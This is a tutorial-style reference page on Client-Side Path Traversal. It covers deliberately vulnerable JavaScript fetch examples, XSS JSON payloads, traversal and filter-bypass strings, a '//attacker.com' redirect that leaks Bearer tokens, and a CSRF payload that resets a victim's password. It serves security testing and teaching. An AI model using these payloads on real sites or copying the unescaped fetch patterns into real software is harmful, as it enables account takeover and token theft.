---
description: Using ../ sequences and URL parts to rewrite requests made by the browser
---

# Client-Side Path Traversal (CSPT)

The vulnerability class named "Client-Side Path Traversal" is as its name suggests, about path traversals in the browser, so URLs. It occurs when an application fetches some path with your input in it, allowing you to use `../` and other special characters to rewrite the path to somewhere else.

<pre class="language-javascript" data-title="Vulnerable example"><code class="lang-javascript">const id = new URLSearchParams(location.search).get('id');
<strong>const info = await fetch(`/articles/${id}`).then(r => r.json());
</strong>document.getElementById('description').innerHTML = info.description;
</code></pre>

The above example takes the `?id=` query parameter, pastes it into the `/articles/${id}`path **without escaping**, and then puts the resulting `description` into an unsafe `innerHTML` sink.

If the attacker normally has no control over the value of the description, they can gain control by uploading a fake JSON file via any such functionality that responds with the required content, such as:

{% code title="xss.json" %}
```json
{
  "description": "<img src onerror=alert(origin)>"
}
```
{% endcode %}

If they then have a URL that this upload is fetchable on, they can rewrite the metadata path like this:

{% code title="Payload" %}
```url
id=../uploads/xss.json
```
{% endcode %}

The JavaScript pastes this ID into `/articles/../uploads/xss.json`, which resolves to `/uploads/xss.json` returning the uploaded content. It then uses this response unsafely resulting in XSS.

***

There's a lot more depth to this vulnerability, like handling suffixes, sanitization bypasses and alternative impact like CSRF, as well as various ways of gaining control over a response. This will all be explained below.\
One related concept is overwriting other **query parameters** if the fetch unsafely puts your input into these without escaping.

{% code title="Vulnerable example" %}
```javascript
const results = await fetch(`/api/search?q=${q}`).then(r => r.json());
```
{% endcode %}

It's possible to use `&` to add more parameters and `#` to truncate them, for more information on this, read the almost equivalent server-side version of in PortSwigger's Academy:

{% embed url="https://portswigger.net/web-security/api-testing/server-side-parameter-pollution" %}
Explanation of parameter pollution
{% endembed %}

## Path Traversal

The first example explained above is the simplest, no sanitization and control over the end (suffix) of the path. There are other complex scenarios where more tricks are required.

### Remove suffix

When your input is partially inside of a URL with another part of the path appended, the injection may feel quite limited because the destination of your path traversal always has this part appended, limiting the number of hittable endpoints that accept such a format. In Path Traversal on the _filesystem_, it's hardly ever possible to truncate the end of the path.

With URLs, however, this is easy with the `?` to start query parameters or `#` to start a hash fragment, after which any data will not be part of the _path_.

{% code title="Vulnerable example" %}
```javascript
const metadata = await fetch(`/articles/${id}/metadata`).then(r => r.json());
```
{% endcode %}

The above is exploitable via the following injection:

{% code title="Payload" %}
```url
id=../uploads/xss.json%3f
```
{% endcode %}

It decodes to `../uploads/xss.json?`, which when merged with the fetch path, results in `/articles/../uploads/xss.json?/metadata`. This is resolved to `/uploads/xss.json?/metadata` which can match the uploaded file again.\
The same would work with `#` encoded as `%23`, resulting in `/uploads/xss.json#/metadata` where the hash fragment (`#/metadata`) isn't even sent to the server.

As a last trick, in some PHP servers it doesn't matter what is after the `file.php` in the URL, it can be treated as a directory with any complex path appended, such as:

```url
/profile.php/metadata
```

If you really cannot find any way to control the suffix or a useful gadget where it doesn't matter, try looking for more CSPT vulnerabilities, because when you find one it's often a more global pattern. These may have less sanitization in place.

### Single '..'

In some situations like filenames or directory names, a lot of characters except `/` are often allowed. This is also common when dealing with URL-encoding functions like [`encodeURIComponent`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent), which disallow many characters except `.` dots.

This makes it hard to perform path traversal into any arbitrary directory, but you can **still use exactly** **`..`** as a payload in one part of the URL to traverse it back by one.\
This often requires more inputs into the URL to rewrite it to a useful path after the traversal, because it's still quite limited.

{% code title="Vulnerable example" %}
```javascript
const group = encodeURIComponent(group);
const user = encodeURIComponent(user);
const id = encodeURIComponent(id);
await fetch(`/users/${group}/${user}/posts/${id}`).then(r => r.json());
```
{% endcode %}

The `group` can be set to `..` to traverse away the `users/` directory, then `user` set to `uploads` to get into a new one. Finally, set `id` to the uploaded file `xss.json`.

{% code title="Payload" %}
```url
group=..&user=uploads&id=xss.json
```
{% endcode %}

This will be resolved as:

1. `/users/${group}/${user}/likes/${id}`
2. `/users/../uploads/likes/xss.json`
3. `/uploads/likes/xss.json`

If you're able to create a directory named `likes` in which you can upload, this path would now be in your control.

[This writeup](https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/0625#arbitrary-file-write) had a similar idea using a file write vulnerability.

### Empty

Similar to the last idea, you can use short sequences like `/` or `.` in paths as well to send them to a wrong handler. These don't completely rewrite the URL, only shorten it to potentially hit a less specific handler.

{% code title="Vulnerable example" %}
```javascript
const id = encodeURIComponent(id);
await fetch(`/users/${id}`).then(r => r.json());
```
{% endcode %}

While this normally hits the `/users/:id` handler, making the `id` empty, `/` or `.` can cause it to fetch `/users/` instead. This can possibly hit a more general handler that returns data for _all_ users instead of a specific one:

{% code title="Payloads" %}
```
id=
id=/
id=.
```
{% endcode %}

The resulting fetches are `/users/`, `/users//` and `/users/.`.&#x20;

### Filter bypasses

You'll encounter intentional or unintentional filters by various different functions, either custom or builtin. Below is a table of 3 common URL-encoding functions that do different things:

<table><thead><tr><th width="209.3333740234375">Function</th><th>Disallowed</th></tr></thead><tbody><tr><td><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/escape"><code>escape</code></a></td><td><code>!"#$%&#x26; '(), :;&#x3C;=>? [\]^`{|}~</code> (<a href="https://shazzer.co.uk/vectors/6867a29622ae8ab707b832b4">Shazzer</a>)</td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI"><code>encodeURI</code></a></td><td> <code>"  %         &#x3C; >  [\]^`{|}</code> (<a href="https://shazzer.co.uk/vectors/6867a25222ae8ab707b832b2">Shazzer</a>)</td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent"><code>encodeURIComponent</code></a></td><td><code>! #$%&#x26;    ,/:;&#x3C;=>?@[\]^`{|}</code> (<a href="https://shazzer.co.uk/vectors/6867a20d22ae8ab707b832b0">Shazzer</a>)</td></tr></tbody></table>

Note how _only `encodeURIComponent`_ escapes `/` slashes, and _none of them_ encode `.` dots. The `encodeURI` is the least restrictive, allowing query parameter characters still.\
If the wrong function is used or it is trusted in a spot where critical characters are still allowed, you will still be able to perform path traversal.

Even through URL-encoding, some servers in combination with [reverse-proxies.md](../server-side/reverse-proxies.md "mention") can decode them for you, still resolving the path traversals. You should test how exactly different strings are parsed before concluding it is impossible.\
Checks can sometimes even be bypassed by intentionally encoding specific characters that allow it, test both casings like `%2f` and `%2F` to make sure it's not case sensitive.

#### Backslashes and multiple

In URLs parsed by the browser, `\` (backslash) is equivalent to `/` (forward slash), even in path traversals. In fact, when the request is sent out to the server it even replaces them so the server receives a regular slash.

This can be combined with _multiple_ slashes by the server if it allows them. It can be very useful if a custom check blocks `/` characters, for example:

```javascript
fetch(String.raw`/a\path/to\somewhere\..\and/back//multiple\//\/\slashes`)
```

This fetches `/a/path/to/and/back//multiple//////slashes`, which a server may interpret wildly different than the fetcher expected.&#x20;

#### Tabs and newlines are stripped

[The URL standard](https://url.spec.whatwg.org/#url-parsing) specifies that `\t`, `\n` and `\r` will all be removed from the input before starting to parse. This is a useful fact that can help in bypassing filters that look for longer sequences of text, such as `..`. It can be replaced with `.\n.` or `.\t.` which will just be read as `..` and still allow path traversal.

```javascript
fetch("/dir/.\n./blo\ncked\t-path")
```

This crazy path doesn't contain the string ".." or "blocked", but still sends a request to `/blocked-path`.

### Path to Path

In all the previous (and next) examples, query parameters are shown as where the input comes from. This is an easy variant where you have complete control, but it won't always be so nice. If your input came from a path parameter into a fetch with a path parameter, using things like `../` will have the same meaning in both contexts and may be resolved before you want them to.

An easy solution may be to URL-encode the payload, the browser/server won't recognize it as literal path traversal anymore, and pass it through. The JavaScript code then needs to explicitly URL-decode your input in order for the `%2e%2e%2f` to become active again.

The browser will always parse the URL the same way, but if you're dealing with a server or reverse proxy that decodes and resolves your path traversals, it may be possible to to obfuscate it using any of the above mentioned tricks (**backslashes** and **tabs & newlines)**. For example `%2e%0a%09%2E\other`:

1. `/blog/${folder}/post`
2. `/blog/%2e%0a%09%2E\other/post`
3. `/blog/.\n\t.\other/post`
4. `/blog/../other/post`
5. `/other/post`

### Open redirect with //

In cases where your input is the first part of a URL, there's a special parsing rule in the browser you can abuse to point it to a completely different (attacker-controlled) host.

{% code title="Vulnerable example" %}
```javascript
const info = await fetch(`/${lang}/info`).then(r => r.json());
```
{% endcode %}

A URL starting with `//` (without a protocol) is seen as an absolute URL, where the protocol is implied from the current one. Like `//example.com` pointing to `https://example.com`. When there is only a first `/` followed by your input, you can start your input with a 2nd slash and then a hostname to point it to.

{% code title="Payload" %}
```url
lang=/attacker.com
```
{% endcode %}

This results in a fetch to `//attacker.com/info` to which you can respond with any data (after enabling [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#the_http_response_headers) on your server), or **leak** anything that's sent with the response like POST data, or Bearer tokens in the headers.

## Sources

If you can partially rewrite the path, the next step is to control the content (unless you're looking for [#csrf](client-side-path-traversal-cspt.md#csrf "mention")).

### File Uploads

One of the most common and simple ones are file uploads, where you can get a response returned with content you desire. This is common functionality often protected by not allowing `.html` files, setting the `Content-Disposition: attachment` header or a CSP, but none of these protect against fetching them for their content.

In most cases this is quite straight-forward, simply upload the content you need as any allowed extension and point the fetch to it.

#### Polyglots

When the application performs validation on the uploaded file, it may not like the JSON format, and expect only PDFs or images. In this case you'll need to create one file that can be seen as two different formats: a polyglot. In JSON, the hard part is that it needs to start with `{"` to open a key, inside the quotes can be almost anything, and then it needs to close again with `"}`.

This opens the door for formats that have their magic bytes not at the start, but somewhere later in the file. The following article shows two examples of how PDF and WebP (images) can be formatted in a way that they are valid JSON and can serve as a CSPT source.

{% embed url="https://blog.doyensec.com/2025/01/09/cspt-file-upload.html" %}
Turning PDF and WebP into JSON polyglots for CSPT
{% endembed %}

The case where it expects HTML to be rendered in the response is quite easy to bypass, because HTML has no strict format, see [#embed-raw-data-polyglots](../../forensics/file-formats.md#embed-raw-data-polyglots "mention") for more info.

### Content Type confusion

When the server expects HTML as a response, there is no validation that happens with the format, because HTML has no errors. Any resource _containing_ the string `<img src onerror=alert(origin)>` may now become a target to reach with your CSPT.\
One example is any JSON endpoint that returns your input, by default characters such as `<` are not encoded, and so can be used as a HTML response if the server allows it.

```javascript
const html = await fetch(`/post/${id}/content`).then(r => r.text());
document.getElementById('post_content').innerHTML = html;
```

We could rewrite it with `../users/1337?` to fetch our name:

{% code title="/users/1337" %}
```json
{"name": "<img src onerror=alert(origin)>"}
```
{% endcode %}

This results in the above response being rendered raw as HTML, a successful XSS:

<figure><img src="../../.gitbook/assets/image (72).png" alt="" width="279"><figcaption><p>HTML in DevTools showing interpreted <code>&#x3C;img></code> tag</p></figcaption></figure>

### Open Redirect

Combined with CSPT, an Open Redirect can become a very powerful gadget. Because they are inherently on the main site and server-redirect to an attacker's site, your CSPT will be able to reach its path and the attacker can return any arbitrary content they want (even specific headers).

For example, assume `/redirect?url=https://attacker.com` is a gadget on the target. The following code can be exploited easily now:

{% code title="Vulnerable example" %}
```javascript
const info = await fetch(`/articles/${id}`).then(r => r.json());
document.getElementById('description').innerHTML = info.description;
```
{% endcode %}

A payload like `../redirect?url=https://attacker.com` will send the fetch through to the attacker, who can now respond with anything they want.

Even closed redirects can be useful, if they are only able to redirect to other trusted domains. These domains may have more ways of [#file-uploads](client-side-path-traversal-cspt.md#file-uploads "mention") or [#content-type-confusion](client-side-path-traversal-cspt.md#content-type-confusion "mention") that can finalize your exploit.

## Sinks

The goal of returning arbitrary content in CSPT getting user input into places it's not supposed to be. You're able to control the exact response of the server and set properties that contain dangerous values, so carefully examine what logic happens with the response.

### HTML

As seen in many of the examples above, if HTML is expected, you can simply return an XSS payload. Some frameworks like [HTMX](https://htmx.org/docs/) or hotswapping logic work this way where raw HTML is expected to be returned. If you are able to inject into any of these kinds of paths, it's a great target.

Also note how the JavaScript handles your HTML after is receives it. If it parses and extracts some part (eg. with a `querySelector`), match that with your injection.

### Recursion

When the response is JSON, you've gained control over some properties. So why not CSPT them as well?

This is a very common situation, where the server fetches some IDs from the server, which it trusts, and then does more sensitive stuff with. It can lead to even more user input, eventually [#html](client-side-path-traversal-cspt.md#html "mention") or the request itself may be an interesting [#csrf](client-side-path-traversal-cspt.md#csrf "mention") target (eg. going from GET to a POST).

## CSRF

Instead of controlling the _response_ and looking for sinks, the request itself may be able to trigger some dangerous things for the signed-in user. Cookies will be sent with these requests, even `SameSite=Strict` ones, so [cross-site-request-forgery-csrf.md](cross-site-request-forgery-csrf.md "mention") has a high chance of being possible.

If you're lucky, the JavaScript logic even has similar logic where it adds CSRF tokens or Bearer authentication headers. In this case, you'll be sending a request to any endpoint authenticated as the user. That makes it crucial to know all endpoints in the application that you can hit in any way possible to get some impact out of it.

The _method_ of your request is important to keep in mind because you cannot change it with your path traversal. GET requests are rarely state-changing, but can be if authenticated with a Bearer token, for example. You can also try hitting regularly POST endpoint with an equivalent GET request instead, _moving all body parameters to query parameters_. \
If you are sending a POST request, it's unlikely you have any control over the body parameters. Therefore you can try to see if the server accepts the same values given through query parameters, still with a POST body. These are controllable in the path traversal by appending `?key=value&`, and may allow you to perform sensitive actions.

{% code title="Vulnerable example" %}
```javascript
fetch(`/analytics/${lang}/ping`, {
  method: "POST",
  headers: {
    Authorization: `Bearer: ${auth_token}`,
    "Content-Type": "x-www-form-urlencoded"
  },
  body: new URLSearchParams({referrer: document.referrer})
});
```
{% endcode %}

The payload should become: `../reset_password?new=hacked#`, resulting in `/analytics/../reset_password?new=hacked#/ping` and the following request:

<pre class="language-http" data-title="Request"><code class="lang-http"><strong>POST /reset_password?new=hacked HTTP/1.1
</strong>Content-Type: x-www-form-urlencoded
Authorization: Bearer ${auth_token}

referrer=https%3A%2F%2Fexample.com%2F
</code></pre>

If the server accepts the parameters via the query string during a POST, it will find the expected `?new=` parameter to change their password.

Even forms can be victim to this quite often, requiring the user to interact with them, but still sending a malicious request when they do:

{% code title="Vulnerable example" %}
```html
<form action="/edit/<?= $id ?>" method="post">
  <button type="submit">Submit</button>
</form>
```
{% endcode %}

After injecting the same payload again, the form becomes:

{% code title="After injection" %}
```html
<form action="/edit/../reset_password?new=hacked" method="post">
  <button type="submit">Submit</button>
</form>
```
{% endcode %}

The moment the user clicks the _Submit_ button, their password will be changed to "hacked".
